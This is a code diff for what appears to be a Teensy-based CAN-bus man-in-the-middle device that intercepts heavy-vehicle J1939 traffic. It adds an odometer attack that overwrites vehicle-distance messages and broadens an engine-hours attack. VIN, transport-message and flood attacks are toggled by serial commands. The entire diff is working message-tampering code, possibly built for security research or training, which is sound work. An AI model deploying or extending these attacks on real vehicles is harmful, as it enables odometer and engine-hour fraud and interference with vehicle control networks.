@@ -13,6 +13,7 @@ boolean GREEN_LED_state;
 boolean YELLOW_LED_state;
 boolean AMBER_LED_state;
 
+boolean odometer_attack_state;
 boolean engine_hours_attack_state;
 boolean transport_message_attack_state;
 boolean vin_attack_state;
@@ -33,7 +34,7 @@ void setup() {
   pinMode(LED_BUILTIN,OUTPUT);
   RED_LED_state = true;
   GREEN_LED_state = true;
-  YELLOW_LED_state = true;
+  YELLOW_LED_state = false;
   AMBER_LED_state = true;
 
   vehicle_can.begin();
@@ -52,6 +53,12 @@ void setup() {
   ecu_can.enableFIFO();
   ecu_can.enableFIFOInterrupt();
   ecu_can.onReceive(rx_ecu_can);
+
+  odometer_attack_state = false;
+  engine_hours_attack_state = false;
+  transport_message_attack_state = false;
+  vin_attack_state = false;
+  flood_attack_state = false;
 }
 
 void rx_vehicle_msg(const CAN_message_t &msg){
@@ -63,12 +70,30 @@ void rx_vehicle_msg(const CAN_message_t &msg){
 
 void rx_ecu_can(CAN_message_t &msg){
   if (engine_hours_attack_state){
-    if (msg.id == 0x18FEE500){// Engine hours from engine #1
+    if ((msg.id & 0x00FFFF00) == 0xFEE500){// Engine hours from engine #1
       Serial.println("Changing Message for Hours.");
       msg.buf[0]=0xAA;
-      msg.buf[1]=0xAA;
-      msg.buf[2]=0xAA;
-      msg.buf[3]=0xAA;
+      msg.buf[1]=0x0;
+      msg.buf[2]=0x0;
+      msg.buf[3]=0x0;
+      msg.buf[4]=0xAA;
+      msg.buf[5]=0x0;
+      msg.buf[6]=0x0;
+      msg.buf[7]=0x0;
+    }
+  }
+  
+  if (odometer_attack_state){
+    if (msg.id == 0x18FEE000){// Vehicle distance from engine #1
+      Serial.println("Changing Message for Odometer.");
+      msg.buf[0]=0xAA;
+      msg.buf[1]=0x00;
+      msg.buf[2]=0x00;
+      msg.buf[3]=0x00;
+      msg.buf[4]=0xAA;
+      msg.buf[5]=0x00;
+      msg.buf[6]=0x00;
+      msg.buf[7]=0x00;   
     }
   }
   if (vin_attack_state){
@@ -88,14 +113,12 @@ void rx_ecu_can(CAN_message_t &msg){
       msg.buf[1]='A'; //0x61
       msg.buf[2]='T'; //0x74
       msg.buf[3]='T'; //0x74
-      msg.buf[4]='A';
-      msg.buf[5]='C';
+      msg.buf[4]='A'; //0x61
+      msg.buf[5]='C'; 
       msg.buf[6]='K';
       msg.buf[7]=' ';
       transport_message_attack_state = false;
     }
-    
-   
   }
   ecu_rx_count++;
   YELLOW_LED_state = !YELLOW_LED_state;
@@ -116,6 +139,7 @@ void loop() {
     else if (c == 't') transport_message_attack_state = !transport_message_attack_state;
     else if (c == 'v') vin_attack_state = !vin_attack_state;
     else if (c == 'f') flood_attack_state = !flood_attack_state;
+    else if (c == 'o') odometer_attack_state = !odometer_attack_state;
     Serial.println(c);
   }
   RED_LED_state = (transport_message_attack_state ||
